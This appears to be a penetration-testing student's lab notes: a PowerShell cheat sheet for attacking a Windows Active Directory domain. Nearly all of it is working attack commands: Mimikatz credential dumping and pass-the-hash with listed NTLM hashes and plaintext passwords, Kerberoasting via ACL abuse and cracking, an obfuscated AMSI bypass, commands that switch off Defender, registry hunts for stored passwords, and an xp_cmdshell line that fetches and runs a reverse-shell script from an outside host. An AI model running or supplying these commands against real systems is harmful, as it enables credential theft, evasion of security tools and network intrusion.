
$user = "USFUN\pastudent149"; $pass = ConvertTo-SecureString -String "vEaXa3xHGZrUgkYb" -AsPlainText -Force; $cred149 = New-Object System.Management.Automation.PSCredential -ArgumentList $user, $pass
$sessTo149 = New-PSSession -Credential $cred -ComputerName "PA-User149"
Copy-Item C:\Users\pastudent149\Documents\Invoke-Mimikatz.ps1 -Destination .\Invoke-Mimikatz.ps1 -FromSession $sessTo149
Copy-Item C:\Users\pastudent149\Documents\PowerUp.ps1 -Destination .\PowerUp.ps1 -FromSession $sessTo149
Copy-Item C:\Users\pastudent149\Documents\PowerView.ps1 -Destination .\PowerView.ps1 -FromSession $sessTo149

$user = "usfun\db1user"
$pass = ConvertTo-SecureString -String "Vjltv1Enivad1232" -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential -ArgumentList $user, $pass

iex(iwr http://192.168.50.149/Invoke-Mimikatz.ps1)

.\IM.ps1 -Command '"sekurlsa::pth /user:jumpsrvadmin /domain:USFUN /ntlm:2b103377e6368077f71085dc6ce8b81b /run:powershell.exe"'
Invoke-Mimikatz -Command '"sekurlsa::pth /user:jumpsrvadmin /domain:USFUN /ntlm:2b103377e6368077f71085dc6ce8b81b /run:powershell_ise.exe"'
Invoke-Mimikatz -Command '"sekurlsa::pth /user:appadmin /domain:USFUN /ntlm:fbf4f078e639b8adc94791127b86bb49 /run:powershell_ise.exe"'
Invoke-Mimikatz -Command '"sekurlsa::pth /user:db1user /domain:USFUN /password:Vjltv1Enivad1232 /run:powershell.exe"'

Invoke-Mimikatz -Command '"sekurlsa::pth /user:Administrator /domain:USFUN /ntlm:1a9dfebcfd67f578d55f6878d629abdb /run:powershell_ise.exe"'
Add-Content IM.ps1 "Invoke-Mimikatz -Command 'privilege::debug token::elevate lsadump::lsa /patch' "

#Found the TightVNC Password in the registry
$passwordTVNC = Get-ItemProperty HKLM:\SOFTWARE\TightVNC\Server | Select Password -ExpandProperty Password
$asHex = ($passwordTVNC | ForEach-Object ToString x2) -join ""
# Hash is: cd58214a7f01a38c
.\vncpwd.exe cd58214a7f01a38c

 -- Mikeym!k

 # See current NTLM stored passwords
.\mimikatz.exe "privilege::debug" "sekurlsa::msv" "exit"
# see Kerberos creds
.\mimikatz.exe "privilege::debug" "sekurlsa::kerberos" "exit"
# Show  all available tickets
.\mimikatz.exe "privilege::debug" "sekurlsa::tickets" "exit"
# dump kerberos tickets
.\mimikatz.exe "privilege::debug" "kerberos::list /export" "exit"
# pass the ticket with mimikatz
.\mimikatz.exe "privilege::debug" "kerberos::ptt db1user.kirbi" "exit"
# pass the hash
.\mimikatz.exe "privilege::debug" "sekurlsa::pth /user:UFC-SQLDEV$ /ntlm:A601EB8ADCA5CF6DCB0A7DA10AE9ECBD /domain:USFUN" "exit"

# Can we reuse a kirbi ticket? (Do step 4 of the Kerberos process)

Get-NetUser -SPN | where-object {$_.ServicePrincipleName -ne "$null"} | ft -Property ServicePrincipalName,cn,samaccountname
Request-SPNTicket

#Disable Defender
Invoke-Command -Session $sesssql -ScriptBlock { Set-ExecutionPolicy bypass; c; Set-MpPreference -DisableRealtimeMonitoring $true}

# Find files that may have passwords
Get-Childitem –Path C:\ -Include *unattend*,*sysprep* -File -Recurse -ErrorAction SilentlyContinue | where {($_.Name -like "*.xml" -or $_.Name -like "*.txt" -or $_.Name -like "*.ini")}
reg query "HKCU\Software\ORL\WinVNC3\Password"
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" #Autologin
reg query "HKLM\SYSTEM\CurrentControlSet\Services\SNMP" /s
reg query "HKCU\Software\TightVNC\Server"
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s #Check the values saved in each session, user/password could be there
reg query "HKCU\Software\OpenSSH\Agent\Key"

# Search for passwords inside all the registry 
reg query HKLM /f password /t REG_SZ /s #Look for registries that contains "password"
reg query HKCU /f password /t REG_SZ /s #Look for registries that contains "password"
reg query HKLM /f sqlreportuser /t REG_SZ /s #Look for registries that contains "password"

# From our current user can we manipulate anything on sqlreport user?
Get-ObjectAcl -SamAccountName sqlreportuser -ResolveGUIDs | select IdentityReference,ObjectDN,ActiveDirectoryRights | Where-Object {$_.IdentityReference -like "*sqldev*" }
# Bingo!
# Write to the ACE and add a field that doesn't exist for the user you want to steal their ticket
Set-DomainObject -Identity sqlreportuser -SET @{serviceprincipalname='sqlreportuser/funcrop.local'}
# Now request the ticket based on the service principal name you created and save out the hash
Get-DomainSPNTIcket sqlreportuser/funcorp.local | select hash -ExpandProperty hash | out-file .\sqlreportuser-hash.txt
# Alternatively, you can add '-OutputFormat Hashcat' or '-OutputFormat John' to dump that way
Set-domainObject -Identify sqlreportuser -Clear serviceprincipalname

# Now try and crack it with john
.\Desktop\shared\john-1.9.0-jumbo-1-win64\john-1.9.0-jumbo-1-win64\run\john.exe --wordlist=.\Documents\rockyou.txt .\Documents\sqlreportuser-hash_bom.txt
.\Desktop\shared\john-1.9.0-jumbo-1-win64\john-1.9.0-jumbo-1-win64\run\john.exe .\Documents\sqlreportuser-hash_bom.txt
# that was a negative, try hashcat? Same results. Maybe we have a good password generator here. 
.\Desktop\shared\john-1.9.0-jumbo-1-win64\john-1.9.0-jumbo-1-win64\run\john.exe --wordlist=.\Documents\filtered_top_100k.txt .\Documents\sqlreportuser-hash_bom.txt
# that found it. Just had to iterate through some wordlists

### Getting around AMSI
# 
sET-ItEM ( 'V'+'aR' + 'IA' + 'blE:1q2' + 'uZx' ) ( [TYpE]( "{1}{0}"-F'F','rE'  ) ) ;    (    GeT-VariaBle ("1q2u"  +"zX"  )  -VaL  )."A`ss`Embly"."GET`TY`Pe"((   "{6}{3}{1}{4}{2}{0}{5}" -f'Util','A','Amsi','.Management.','utomation.','s','System'  ) )."g`etf`iElD"( ( "{0}{2}{1}" -f'amsi','d','InitFaile'  ),(  "{2}{4}{0}{1}{3}" -f 'Stat','i','NonPubli','c','c,' ))."sE`T`VaLUE"( ${n`ULl},${t`RuE} )
# that only works for the session you are in
# other options for the AV are below
Invoke-Command -ScriptBlock{ Set-MpPreference -DisableIOAVProtection $true} -Session $sess
Invoke-Command -ScriptBlock{ Set-MpPreference -DisableRealtimeMonitoring $true} -Session $sess
Set-ItemProperty -Path "Registry::HKLM\SOFTWARE\Microsoft\Windows Defender" -Name "DisableAntiSpyware" -Value 1 -Force
# Getting files around
iex (iwr http://192.168.49.150/Invoke-Mimikatz.ps1)
# check to see if it really got loaded in memory
help Invoke-Mimikatz
## Applocker go-around
# See what is there
roger
# if there are some default rules to specific locations, you can just use those locations by copying the script to that directory
# If you are in constrained langauge mode, you have to append the function call to the end of the script

# Everytime you find a hash, you have to then use Invoke-Mimikatz and run your enumeration AGAIN with the new perms
Find-LocalAdminAccess -Verbose
Invoke-CheckAdminAccess -Verbose


## Use CredSSP
# See if it is available
Get-WSManCredSSP
# enable it on this box if it isn't
Enable-WSManCredSSP -Role Client -DelegateComputer USFUN\PA-USER149
Set-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Control\lsa\Credssp\PolicyDefaults\AllowFreshCredentialsDomain -Name WSMan -Value "WSMAN/*.us.funcorp.local"
# or to make it even more global
Set-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Control\lsa\Credssp\PolicyDefaults\AllowFreshCredentialsDomain -Name WSMan -Value "WSMAN/*"
# then make it enabled on the box you want to hop through
Invoke-Command -Credential $cred -ScriptBlock { Enable-WSManCredSSP -Role Server} -ComputerName UFC-JumpSrv
Invoke-Command -Credential $cred -ScriptBlock { Enable-PSRemoting} -ComputerName UFC-JumpSrv
Invoke-Command -Credential $cred -ComputerName UFC-JumpSrv -ScriptBlock {Set-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Control\lsa\Credssp\PolicyDefaults\AllowFreshCredentialsDomain -Name WSMan -Value "WSMAN/*"} 
# Now you can enter a pssession and still use invoke-command from that box to the next one
Enter-PSSession -Credential $cred -ComputerName UFC-JumpSrv -Authentication Credssp


# it pings the HFS server, so we are close!
Get-SQLServerLinkCrawl -Instance UFC-SQLDev -Query "EXEC master..xp_cmdshell 'powershell  invoke-expression(new-object system.net.webclient).downloadString(''http://192.168.50.149/Invoke-PowerShellTcp.ps1'') | powershell '" | select instance,customQuery -ExpandProperty CustomQuery | where {$_.Instance -like "AC-DBBUSINESS"}


## File search tricks
Invoke-Command -Session $sess -scriptblock { $findDate = Get-Date -Year 2019 -Month 10 -Day 30}
Invoke-Command -Session $sess -scriptblock { gci -Path C:\ -Include *.ps1 -File -Recurse -Erroraction 'silentlycontinue' -Force | where-object{ $_.LastWriteTime -ge $FindDate} }

